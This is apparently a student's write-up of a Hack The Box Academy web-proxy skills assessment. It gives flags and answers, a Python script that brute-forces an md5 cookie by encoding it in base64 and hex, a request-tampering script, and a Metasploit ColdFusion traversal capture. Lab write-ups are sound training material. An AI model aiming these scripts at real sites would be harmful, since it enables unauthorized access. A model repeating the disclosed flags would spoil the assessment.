# Section 15: Skills Assessment - Using Web Proxies

Module: 14. Using Web Proxies

---

## Questions & Answers

### 1. The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.

Context:
- Open `/lucky.php` and open DevTools to delete the `disabled` attribute:
```html
<button class="btn block-cube block-cube-hover" id="submit" type="submit" formmethod="post" name="getflag" value="true">
    <SNIP>
    <div class="text">
        Click for a chance to win a flag!
    </div>
</button>
```
- Or use Burp Suite to intercept the request & response to remove the `disabled` attribute, my script to get the flag fast:
```python
import requests

TARGET = "http://154.57.164.82:32677/lucky.php"

for i in range(1,20):
    response = requests.post(TARGET, data="getflag=true", headers={"Content-Type": "application/x-www-form-urlencoded"})

    if "HTB{" in response.text:
        print(response.text)
```
```bash
┌─[eu-academy-2]─[10.10.14.91]─[htb-ac-2162140@htb-rfpvkxbcle-htb-cloud-com]─[~/Documents]
└──╼ [★]$ python3 ./exploit.py 
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>I'm feeling lucky!</title>
    <link rel="stylesheet" href="./style.css">
</head>

<body>
    <form name='getflag' class='form' method='post' id='form1'>
        <button class='btn block-cube block-cube-hover' id='submit' type='submit' formmethod='post' name='getflag' value='true' disabled>
            <div class='bg-top'>
                <div class='bg-inner'></div>
            </div>
            <div class='bg-right'>
                <div class='bg-inner'></div>
            </div>
            <div class='bg'>
                <div class='bg-inner'></div>
            </div>
            <div class='text'>
                Click for a chance to win a flag!
            </div>
        </button>
    </form>
</body>

</html>

<p style="text-align:center">HTB{d154bl3d_bu770n5_w0n7_570p_m3}</p>
```

**Answer:** `HTB{d154bl3d_bu770n5_w0n7_570p_m3}`

---

### 2. The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.

Context:
```
4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d

Hexadecimal to base64

M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==

Base64 decode

3dac93b8cd250aa8c1a36fffc79a17a
```

**Answer:** `3dac93b8cd250aa8c1a36fffc79a17a`

---

### 3. Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload)

Context:
- Use Python script:
```python
import requests
import base64

url = "http://154.57.164.82:32677/admin.php"
wordlist_path = "/usr/share/seclists/Fuzzing/alphanum-case.txt"

with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        character = line.strip()
        if not character:
            continue
        
        org = f"3dac93b8cd250aa8c1a36fffc79a17a{character}"
        b64_bytes = base64.b64encode(org.encode('utf-8'))
        b64_string = b64_bytes.decode('utf-8')

        hex_output = b64_string.encode('utf-8').hex()

        cookies = {
            "cookie": hex_output,
            "PHPSESSID": "a4ptfpo9jqq5gf3cmgvdufb32i"
        }

        response = requests.get(url, cookies=cookies)

        if "HTB{" in response.text:
            print(response.text)
```
```bash
<SNIP>
            HTB{burp_1n7rud3r_n1nj4!}
```

**Answer:** `HTB{burp_1n7rud3r_n1nj4!}`

---

### 4. You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.91]─[htb-ac-2162140@htb-rfpvkxbcle-htb-cloud-com]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/coldfusion_locale_traversal[msf](Jobs:0 Agents:0) auxiliary(scanner/http/coldfusion_locale_traversal) >> set PROXIES HTTP:127.0.0.1:8080
PROXIES => HTTP:127.0.0.1:8080
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/coldfusion_locale_traversal) >> set RHOST SERVER_IP
RHOST => http://154.57.164.82/
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/coldfusion_locale_traversal) >> set RPORT 32677
RPORT => 32677
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/coldfusion_locale_traversal) >> run
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
```
- In Burp Suite got:
```
GET /CFIDE/administrator/index.cfm HTTP/1.1
Host: SERVER_IP:32677
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.2903.86
Connection: keep-alive
```

**Answer:** `CFIDE`

---

[Back to Module Index](./README.md)